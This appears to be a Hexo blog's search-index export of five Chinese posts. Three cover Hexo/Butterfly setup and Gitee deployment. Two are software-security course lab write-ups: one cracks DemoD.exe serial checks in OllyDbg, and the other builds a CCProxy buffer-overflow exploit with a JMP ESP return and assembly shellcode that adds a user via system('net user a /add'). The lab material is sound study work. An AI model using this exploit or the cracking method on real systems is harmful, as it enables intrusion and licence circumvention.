<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Butterfly美化记录帖</title>
    <url>/2021/10/30/Butterfly%E7%BE%8E%E5%8C%96%E8%AE%B0%E5%BD%95%E5%B8%96/</url>
    <content><![CDATA[<hr>
<div class='poem'><div class='poem-title'>水调歌头</div><div class='poem-author'>苏轼</div><p>​       丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。<br>​       明月几时有？把酒问青天。<br>​       不知天上宫阙，今夕是何年？<br>​       我欲乘风归去，又恐琼楼玉宇，高处不胜寒。<br>​       起舞弄清影，何似在人间？</p>
<p>转朱阁，低绮户，照无眠。<br>        不应有恨，何事长向别时圆？<br>        人有悲欢离合，月有阴晴圆缺，此事古难全。<br>         但愿人长久，千里共婵娟。</p>
</div>
<hr>
<p><br></p>
<p><a href="https://www.antmoe.com/posts/a811d614/">Hexo 博客之 butterfly 主题优雅魔改系列 | 小康博客 (antmoe.com)</a></p>
<p><br></p>
<p><a href="https://butterfly.lete114.top/article/Butterfly-config.html">Butterfly主题美化-无修改源码 | Lete乐特 ‘s Blog (lete114.top)</a></p>
<p><br></p>
<p><a href="https://zfe.space/post/hexo-butterfly-orchid.html">小冰插件包 butterfly-orchid 1.0 | 小冰博客 (zfe.space)</a></p>
<p><br></p>
<p><a href="https://akilar.top/posts/615e2dec/">Tag Plugins Plus | Akilarの糖果屋</a></p>
<p><br></p>
<p><a href="https://blog.imzjw.cn/posts/b74f504f/">关于我 Butterfly 主题的所有美化 | 小嘉的部落格 (imzjw.cn)</a></p>
<p><br></p>
<p><a href="https://butterfly.js.org/">Butterfly - A Simple and Card UI Design theme for Hexo</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo部署到Gitee及相关问题</title>
    <url>/2021/04/19/Hexo%E9%83%A8%E7%BD%B2%E5%88%B0Gitee%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前一直都是写好文章后直接部署到Github上，但最近发现Github会经常性连接不上，这对于我这个希望即写即传的人来说实在是太难受了。后来想到之前将图床部署在Gitee上，那么能不能将博客也部署在Gitee上呢？话不多说直接上手搜一手，果不其然是可以的，由于Gitee是国内的，不存在说连不上的问题，所以直接决定动手部署了！</p>
<hr>
<h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><ul>
<li>类似于在Github上部署的操作，在Gitee上先创建一个用户名同名的仓库，创建仓库时，语言选择$html$，可以先不进行初始化，选择公开。</li>
</ul>
<h2 id="添加SSH公钥"><a href="#添加SSH公钥" class="headerlink" title="添加SSH公钥"></a>添加SSH公钥</h2><ul>
<li><p>首先在博客根目录打开$Git\ Bash\ Here$,创建$SSH$公钥命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱地址&quot;</span></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮箱地址(同上一条命令)&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong><em>注意：上面第三条命令中的$ssh-keygen$是连在一起的，没有空格！没有空格！没有空格！重要的事情说三遍，猛男落泪:cry::cry::cry:</em></strong></p>
<p>上面命令进行时会提示公钥存储路径，一般情况下为  C:\Users\用户名.ssh ，查看目录可以发现 id_rsa和 id_rsa.pub​两个文件，其中id_rsa.pub正是我们需要的公钥。一路$Enter$下去即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419161954.png" alt="alt SSH公钥"></p>
<p>最后成功的结果如下图：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419162156.png" alt="alt 密钥成功生成"></p>
</li>
<li><p>接下来在Gitee中添加该公钥即可，具体方法为$“设置\rightarrow SSH公钥”$，添加公钥时公钥标题为仓库的名称，将上述生成的id_rsa.pub中的全部内容粘贴到其中即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419162626.png" alt="alt 添加密钥"></p>
</li>
<li><p>测试密钥连接：在控制台输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@gitee.com</span><br></pre></td></tr></table></figure>
<p>成功结果如下：</p>
</li>
</ul>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419165541.png" alt="alt 密钥连接成功"></p>
<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><ul>
<li><p>接下来修改根目录下的   _config.yml 文件即可，具体修改内容中的$repo$在仓库首页粘贴即可：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419163409.png" alt="alt repo地址"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419163504.png" alt="alt 配置文件修改"></p>
</li>
<li><p>之后按照以前部署的命令一样，直接在清空缓存文件，重新生成后$hexo \ d\ $就行了。</p>
</li>
</ul>
<h2 id="开启Gitee-Pages服务"><a href="#开启Gitee-Pages服务" class="headerlink" title="开启Gitee Pages服务"></a>开启Gitee Pages服务</h2><p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419163911.png" alt="alt Gitee Pages"></p>
<ul>
<li>选择强制使用Https后启动，启动成功后会得到一个地址：<br><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419164119.png" alt="alt 网站地址"></li>
<li>之后在_config.yml中将URL地址修改为该地址即可，需要注意的是每次更新($hexo\ d\ $)后，需要进入$Gitee\ Pages\ $服务进行更新即可。</li>
</ul>
<h2 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h2><ul>
<li>到这里基本上已经部署好了，不过我在部署的时候遇到了一个问题，就是在本地预览正确的文章，部署到上面后再访问却缺失了部分内容，查看仓库中的Html文件代码正确，但是查看页面源代码却消失了！被谁吃了给我吐出来！。后来上网搜索之后找到了一个办法：清除浏览器缓存。一开始不信的我试了一下竟然成功了，好吧，我只能拍手成妙。</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><p><a href="https://blog.csdn.net/qq_38157825/article/details/112783631">Hexo 部署到 Gitee</a></p>
</li>
<li><p><a href="https://blog.csdn.net/weixin_43889439/article/details/92760952">解决git@gitee.com: Permission denied (publickey).</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Gitee</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 建站笔记</title>
    <url>/2021/04/08/Hexo-%E5%BB%BA%E7%AB%99%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="搭建Hexo框架"><a href="#搭建Hexo框架" class="headerlink" title="搭建Hexo框架"></a>搭建Hexo框架</h1><p>本文基于windows操作系统搭建，hexo的相关操作可以用cmd命令台进行，也可以用下面安装的Git进行（推荐）；关于hexo主题的相关美化见后续文章，该系列可能会保持更新。另：本人也作为刚接触这里的新手，在文章中主要总结个人建站过程中的参考所得，望有不对的地方不吝赐教！</p>
<h2 id="设置淘宝镜像"><a href="#设置淘宝镜像" class="headerlink" title="设置淘宝镜像"></a>设置淘宝镜像</h2><p>由于在windows上使用npm下载时可能会速度过慢，所以这里改为淘宝镜像网站：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry <span class="string">&quot;https://registry.npm.taobao.org&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>Git官网地址：<a href="https://gitforwindows.org/">https://gitforwindows.org/</a></p>
<p>安装过程无脑“下一步”即可。</p>
<h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>Node.js官网：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p>
<p>这里推荐安装LTS(长期支持)版，选择对应的系统版本即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408-01.png" alt="image-20210408184444633"></p>
<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>可以自行创建目录，名称随意，例如D:\Hexo\myblog，并在myblog文件夹右键使用Git bash here(或者cmd进入该文件夹)，命令行输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装Hexo</span></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"><span class="comment">#初始化博客</span></span><br><span class="line">hexo init</span><br><span class="line"><span class="comment">#Hexo三连,分别为清空生成文件、生成网站文件、启动本地预览</span></span><br><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
<p>此时若没有错误情况，由于hexo默认位于4000端口开启，则可以在浏览器中打开<strong><em>localhost:4000</em></strong>，就可以看到已经初始化的Hexo博客，默认产生第一篇文章Hello world!此外也可以更换端口使用命令  <strong>hexo s -p 端口号</strong>  即可。</p>
<h2 id="博客部署"><a href="#博客部署" class="headerlink" title="博客部署"></a>博客部署</h2><p>由于我个人搭建的时候服务器仍未达到备案的期限，所以这里介绍将个人博客部署到github上面，后续若部署到个人域名时再进行更新。<br>首先，登录github创建一个新的仓库，并将仓库名命名为  <strong><em>用户名.github.io</em></strong>，注意这里仓库的名字是固定格式！！！<br>打开博客根目录（Hexo/myblog)下的根配置文件  <strong><em>_config.yml</em></strong>  文件找到deploy项，修改如下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">   <span class="built_in">type</span>: <span class="string">&#x27;git&#x27;</span></span><br><span class="line">   repo: https://github.com/用户名/仓库名</span><br><span class="line">   <span class="comment"># 如Https://github.com/zhangsan/zhangsan.github.io</span></span><br><span class="line">   branch: master</span><br></pre></td></tr></table></figure>
<p>注： 注意在本博客几乎所有配置文件中，冒号之后都留有空格</p>
<p>在进行上传之前，需要先在Git bash中进行对<strong>user.name</strong>和<strong>user.email</strong>的设置，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;Github用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;GitHub绑定邮箱&quot;</span></span><br><span class="line"><span class="comment">#最后再进行上传</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>他喵的现在Github时不时登录不上去，所以在进行hexo d部署的时候也经常会出现超时的错误，还是建议部署到自己的域名上去，后续部署时会对该文章进行更新的。</p>
<h1 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h1><h2 id="主题设置"><a href="#主题设置" class="headerlink" title="主题设置"></a>主题设置</h2><p>hexo提供了大量可选的主题，参考网站：<a href="https://hexo.io/themes/">Hexo主题</a></p>
<p>在根目录配置文件中可以设置主题，这里以butterfly主题为例，修改<strong><em>theme</em></strong>字条即可：<br><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408204749.png" alt="alt 主题设置"></p>
<p>在上述网站或其他途径选择主题后需要将主题文件保存到<strong>/themes</strong>目录下，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装渲染插件</span></span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>
<h2 id="基础页"><a href="#基础页" class="headerlink" title="基础页"></a>基础页</h2><p>hexo创建页面的命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page 页面名称</span><br></pre></td></tr></table></figure>
<p>创建成功后会在命令行中提示新建页面的位置，对文件<strong>index.md</strong>进行编辑可以修改页面布局。对不同主题，可以查看相应主题的文档使用，这里以butterfly主题对页面属性为例，如下表：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th style="text-align:center">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">title</td>
<td style="text-align:center">【必需】页面标题</td>
</tr>
<tr>
<td style="text-align:center">date</td>
<td style="text-align:center">【必需】创建日期</td>
</tr>
<tr>
<td style="text-align:center">updated</td>
<td style="text-align:center">【可选】更新日期</td>
</tr>
<tr>
<td style="text-align:center">type</td>
<td style="text-align:center">【必需】页面类型</td>
</tr>
<tr>
<td style="text-align:center">description</td>
<td style="text-align:center">【可选】页面描述</td>
</tr>
<tr>
<td style="text-align:center">top_img</td>
<td style="text-align:center">【可选】顶部图片</td>
</tr>
<tr>
<td style="text-align:center">aside</td>
<td style="text-align:center">【可选】显示侧边栏</td>
</tr>
<tr>
<td style="text-align:center">aplayer</td>
<td style="text-align:center">【可选】加载Aplayer</td>
</tr>
<tr>
<td style="text-align:center">keyworads</td>
<td style="text-align:center">【可选】页面关键字</td>
</tr>
</tbody>
</table>
</div>
<h2 id="文章页"><a href="#文章页" class="headerlink" title="文章页"></a>文章页</h2><p>创建命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;文章命令&quot;</span></span><br></pre></td></tr></table></figure>
<p>同上述基础页介绍，具体属性等可参照下面的参考资料。</p>
<h2 id="页面设置"><a href="#页面设置" class="headerlink" title="页面设置"></a>页面设置</h2><p>打开根目录下的<strong><em>_config.yml</em></strong>文件可以看到下面的属性：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#site</span></span><br><span class="line">title: (1)</span><br><span class="line">description: (2)</span><br><span class="line">author: (3)</span><br><span class="line">language: 默认en,可修改</span><br><span class="line">email: <span class="string">&#x27;邮箱地址&#x27;</span></span><br></pre></td></tr></table></figure>
<p>相应位置如下图：</p>
<p><div align="center">
        <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/%E4%B8%8B%E8%BD%BD.png">  
        <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408212212.png">
</div><br>后续会写对butterfly的美化过程。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>【1】<a href="https://hexo.io/docs/">Hexo文档</a><br>【2】<a href="https://butterfly.js.org/posts/21cfbf15/">Jerry大佬教程</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32漏洞---破解DemoD.exe序列号</title>
    <url>/2021/06/26/Win32%E6%BC%8F%E6%B4%9E-%E7%A0%B4%E8%A7%A3DemoD-exe%E5%BA%8F%E5%88%97%E5%8F%B7/</url>
    <content><![CDATA[<hr>
<p><strong>$ps:$软件安全第一次实验内容，简单破解序列号(最后只破解了部分)</strong></p>
<hr>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p><strong>操作系统：Microsoft windows XP SP3</strong></p>
<p><strong>目标软件：DemoD.exe</strong></p>
<p><strong>分析工具：LordPE, OllyDbg，Visual C++ 6.0</strong></p>
<h1 id="实验过程记录"><a href="#实验过程记录" class="headerlink" title="实验过程记录"></a>实验过程记录</h1><p>首先用OllyDbg打开测试程序，这里对DemoD_简版.exe程序进行分析，对序列码的破解首先由于提示错误以窗口形式出现，所以这里对所有的MessageBox设置API断点，运行程序输入序列码测试发现程序在提示错误的地方发生中断。如下图中所示。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222710.png" alt="找到序列码匹配段的地址"></p>
<p>接下来在代码区右键选择中文搜索引擎，点击智能搜索，会在搜索结果中发现部分提示信息，双击提示信息即可进入该段代码，搜索结果如图所示。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222802.png" alt="利用中文搜索字符串"></p>
<p>双击上图中的“恭喜你！序列号第1部分正确！”进入序列号匹配段，进入后会发现在提示信息之前有一段“cmp eax,ecx”的代码，随后便出现“jnz DemoD_简.0040400C”的跳转指令，猜测cmp的指令为比较输入序列号和正确序列号的值，而跳转指令为输出错误信息的窗口。在比较指令之前设置断点，运行程序，设置第一段序列号为1234，请求验证序列号。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222845.png" alt="设置断点"></p>
<p>运行程序后，发现程序在上述断点处中断，接下来单步执行到比较指令处，由于设置的第一部分序列号为1234，这时观察右侧的寄存器值会发现EAX=00001234，ECX=0000AC70，可以判定EAX为自己所输入的值，而ECX即AC70即为第一段序列号的正确值。接下来，删除该处的断点，将断点设置在第二部分比较指令之前，再次运行，将已知地正确序列号输入，并将即将判断的序列号设置为1234，以此循环往复便可以得到第二部分和第三部分正确序列号的值。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222918.png" alt="第一部分比较"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222944.png" alt="第一部分验证"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223004.png" alt="第二部分比较"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223027.png" alt="第二部分正确"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223052.png" alt="第三部分比较"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223114.png" alt="第三部分正确"></p>
<hr>
<p>第四部分的判断逻辑较为复杂，且只在极少情况下会验证通过，这里只描述第四部分序列码的判断逻辑。观察这一部分的比较前的代码可知，对EAX和ECX的值进行比较，而EAX为ss:[ebp-0x158]处的值，假设我们输入的序列号为A-B-C-D，观察堆栈区地数值可以发现，ECX为A+B+C的值然后右移四位所得。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223205.png" alt="分析逻辑1"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223222.png" alt="分析逻辑2"></p>
<p>由上图可知，EBP-128、EBP-12C和EBP-130处存储的值为上述的ABC，而接下来的便是我们输入的完整的序列码。这里我们继续探究EAX的值即EBP-158处的值，往上查找代码会发现：首先查阅堆栈段发现[EBP-0x138]为A的值，而[EBP-0x144]为D的值，首先将二者相加赋予ECX，再将ECX与0xAFDA进行与操作后得到新的ECX，将ECX的值赋予[EBP-148]后赋给DX，最后将DX赋给[EBP-0x158]，最后得到EAX的值再与ECX进行比较进行判断。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223249.png" alt="分析逻辑4"></p>
<p><strong><em><u>关于第四部分序列号的比较逻辑：</u></em></strong></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223622.png" alt="第四部分序列号"></p>
<hr>
<h1 id="实验问题"><a href="#实验问题" class="headerlink" title="实验问题"></a>实验问题</h1><p>首先便是对<strong><u><em>断点的设置问题</em></u></strong>，利用常规思维便是在某处将输入的序列码与正确的序列码进行比较，而正确的序列码与输入待验证的序列码都存放在寄存器中，通过识别自己输入的序列码便可以获得正确的序列码从而进行下一部分的验证。实验过程中在设置断点时，利用中文搜索引擎获得当序列号输入正确时中文提示的语句所在位置，往上遍历便能得到“CMP”指令进行比较所在位置。这里对于前三部分的断点设置经历尝试后，设置于比较指令之前然后断点停下后再单步运行至该指令即可。</p>
<p>第二个问题便是<strong><em><u>正确序列码的变化问题</u></em></strong>，实验过程中发现，当实验时间超过一定时间后再次运行时，发现之前尝试获得的正确序列码已经发生了变化，重新进行实验验证便会发现已经生成了全新的正确的序列码等待验证。这在实验过程中造成了很大的困扰，多次尝试后才发现了这个问题。如上面实验过程中验证的前三部分正确的序列码为“AC70-BC32-E911”，而下图为另外一次尝试过程中的前三部分序列码验证正确时的场景，此时序列码为“D100-BC32-C386”。经过验证发现大概每1个小时左右序列码便会更新一次。</p>
<p>第三个问题便是<strong><em><u>最后一段序列码的验证问题</u></em></strong>，我仍旧天真的以为第四段序列码的验证方式与前三段的验证方式是相同的，当尝试多次失败后回过头去分析代码才发现程序将输入的前三段序列码进行了一定程度的数学运算后才会进行比较，也就是说第四段序列码并不是单纯的独立序列码，而是与前三段序列码都相关，（具体的运算分析可以参考上述实验一实验过程记录中的分析过程）。此外，在该部分序列码的运算过程中涉及了一个与“0xAFDA”的按位与操作，该操作之后产生的结果与正确的结果比较时会发生较大的误差，由于产生的与“0xAFDA”进行按位与操作的序列码与该时间内产生的序列码前三部分都相关，因此对前三部分序列码的要求较为严格，经过大致的分析，在同一时间内要求产生正确的可行的序列码的概率约为1/8，综合上面讲到的一个小时更换一次序列码来说，时间成本是极高的，因此这里在实验过程中只对第四部分的序列码的产生过程进行了简述。</p>
<hr>
<p>$OK,Let’s\ go!$</p>
]]></content>
      <categories>
        <category>网络攻防</category>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32漏洞实例分析---CCproxy</title>
    <url>/2021/06/27/Win32%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-CCproxy/</url>
    <content><![CDATA[<hr>
<div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>$ps:$正好这两天在备考软件安全要复习实验内容，索性就打算复习实验的同时将部分内容的报告展示出来，做一次记录。实验中的内容可能在实际操作时会有差错，BUG可能会有的。</p>
</div>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p><strong>操作系统：Microsoft windows XP SP3 或者 win7</strong></p>
<p><strong>溢出软件：CCPROXY</strong></p>
<p><strong>溢出工具：OllyDbg，Visual C++ 6.0</strong></p>
<hr>
<h1 id="实验过程记录"><a href="#实验过程记录" class="headerlink" title="实验过程记录"></a>实验过程记录</h1><h2 id="找到溢出点"><a href="#找到溢出点" class="headerlink" title="找到溢出点"></a>找到溢出点</h2><p>首先找出溢出点，在XP主机上打开CCProxy后再cmd控制台上利用“telnet 127.0.0.1”命令连接CCProxy代理服务，实验发现当ping一个较短的字符串时，程序会正常执行并提示“Host not found”，而当程序ping一个较长的字符串时会发生溢出并报错（如下图），利用简单的二分法多次尝试可以发现当ping后最多接1009个字符时恰好不产生溢出，而当其后有1010个字符时会发生溢出，且会溢出覆盖到EIP。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215240.png" alt="溢出点查询" style="zoom:67%;" /></p>
<p>得知上述溢出点后，接下来便可以进行漏洞利用，这里采用的工具为x32dbg，根据之前的“Host not found”提示，我们可以在dbg中进行字符串的搜索并定位到该字符串所在语句（如下图所示），在该语句处设置断点。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215326.png" alt="查找“Host not Found”语句"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215440.png" alt="设置断点"></p>
<h2 id="设置-JMP-ESP-跳转"><a href="#设置-JMP-ESP-跳转" class="headerlink" title="设置$JMP\ ESP$跳转"></a>设置$JMP\ ESP$跳转</h2><p>上述断点设置成功后，在该软件中运行CCProxy并在控制台中ping一个较长的字符串（使其发生溢出），在该软件中会在断点前停下来，这时单步步过执行到“ret 0xc”指令处观察此时的ESP=0x012B66F0，由此可知当“ret 0xc”指令执行后的下一指令对应地址为0x012B66F0，而执行后EIP=[ESP]且ESP=ESP+0xC+0x4，接下来考虑将ESP指向地址覆盖为JMP ESP指令所在地址，然后将修改过的ESP填充我们想要执行的shellcode即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215648.png" alt="Ret指令前的ESP指向值"></p>
<p>此时的我们想要将ESP指向地址执行JMP ESP指令，在本区域内搜索指令“JMP ESP”后发现没有该指令，于是我们查询所有模块中的指令即可。这里搜索到的“JMP ESP”指令众多，考虑到后面我们将JMP ESP指令填入shellcode时将其存放在字符数组内而可编写字符的ASCII范围为0x20-0x7F，我们可以选取0x00514C6E。（也可以使用\x转义）。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215743.png" alt="查询JMP ESP指令"></p>
<p>接下来只需要先把ESP指向地址覆盖为我们想要的“JMP ESP”指令地址即可。观察可以发现在当前ESP指令的接下来一段数据已经被我们输入的字符串（这里输入的全部是‘a’即ASCII码61覆盖）。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215834.png" alt="修改ESP指向地址" style="zoom:50%;" /></p>
<h2 id="添加-Shellcode"><a href="#添加-Shellcode" class="headerlink" title="添加$Shellcode$"></a>添加$Shellcode$</h2><p>接下来我们来实现基本的添加用户的shellcode，在cmd控制台中的命令为“net user a /add”（这里添加一个用户名为a的用户）。在程序语言中便需要调用system函数，在工具中查看当前程序的符号界面会发现该程序加载了“msvcrt.dll”的系统动态链接库文件，而其中便包含有system函数，因此我们就可以利用这一点实现shellcode的注入及利用。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220117.png" alt="程序加载了msvcrt.dll库文件"></p>
<p>接下来我们先编写shellcode来获取shellcode的机器码然后实现注入，这里利用的工具为VS2019，实现win32控制台应用的方法为“新建桌面引导→控制台程序”，编写shellcode的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LoadLibrary(<span class="string">&quot;msvcrt.dll&quot;</span>);</span><br><span class="line">    __asm&#123;</span><br><span class="line">            push ebp ;保存ebp，esp－<span class="number">4</span></span><br><span class="line">            mov ebp,esp ;给ebp赋新值，将作为局部变量的基指针</span><br><span class="line">            <span class="keyword">xor</span> edi,edi ;</span><br><span class="line">            push edi ;压入<span class="number">0</span>，esp－<span class="number">4</span>,;作用是构造字符串的结尾\<span class="number">0</span>字符 </span><br><span class="line">            sub esp,<span class="number">0</span>ch</span><br><span class="line">            mov byte ptr [ebp<span class="number">-10</span>h],<span class="number">6</span>eh;n</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0f</span>h],<span class="number">65</span>h;e</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>eh],<span class="number">74</span>h;t</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>dh],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>ch],<span class="number">75</span>h;u</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0b</span>h],<span class="number">73</span>h;s</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>ah],<span class="number">65</span>h;e</span><br><span class="line">            mov byte ptr [ebp<span class="number">-09</span>h],<span class="number">72</span>h;r</span><br><span class="line">            mov byte ptr [ebp<span class="number">-08</span>h],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-07</span>h],<span class="number">61</span>h;a</span><br><span class="line">            mov byte ptr [ebp<span class="number">-06</span>h],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-05</span>h],<span class="number">2f</span>h;/</span><br><span class="line">            mov byte ptr [ebp<span class="number">-04</span>h],<span class="number">61</span>h;a</span><br><span class="line">            mov byte ptr [ebp<span class="number">-03</span>h],<span class="number">64</span>h;d</span><br><span class="line">            mov byte ptr [ebp<span class="number">-02</span>h],<span class="number">64</span>h;d</span><br><span class="line">            lea eax,[ebp<span class="number">-10</span>h] ;</span><br><span class="line">            push eax ;串地址作为参数入栈</span><br><span class="line">            mov eax, <span class="number">0x77bf93c7</span>;</span><br><span class="line">            call eax ;调用system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后反汇编得到汇编代码，在memory中可以查看到汇编语句在内存中的机器码表示，由于程序已经加载了msvcrt.dll库文件，因此我们这里只需要shellcode的机器码即可，观察汇编代码块中语句的起始地址为01001782（push ebp），结束地址为call命令所在地址，在memory中查找该地址对应的机器码即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220413.png" alt="Shellcode对应机器码" style="zoom:50%;" /></p>
<p>接下来利用缓冲区的溢出来执行shellcode，上述所得在第1012个字节处发生溢出，因此我们需要执行“JMP ESP”指令就需要将该指令的地址填入1013-1016字节，及为上述的00514C6E。当执行完该指令后就会跳转到已经经过变化的ESP处，此时的ESP执行地址应该为1013+0xC+0x4个字节；这里由于CCProxy会有一个字符串的覆盖操作，将第5个字节到1012个字节复制到1013+0xC+0x4字节处，所以我们的shellcode需要放在第5个字节到第1012个字节之间。</p>
<p>本机与CCPROXY 的连接是TCP连接，首先需要编写程序以TELNET的形式登陆到 CCPROXY 上，即建立TCP连接，去连接 CCPROXY 的23号端口，一旦连接建立好了后， 便可以发送 TCP 报文，报文的内容是ping主机名\r\n ，主机名便填写上文提到的超长的字符串进行溢出。注入 shellcode 后执行7FFA4512 即 JMP ESP。字符串的前 4 个字节为无用的字节，从第五个字节开始便可以用来写 ShellCode，构造的ping主机名应当如下：4 个字节的无用指令+ShellCode（最多可以从第5个字节到1012个字节）+jmp esp（第1013个字节到第 1016个）+最后的填充字节。</p>
<p>编写的C语言代码及shellcode机器码如下：</p>
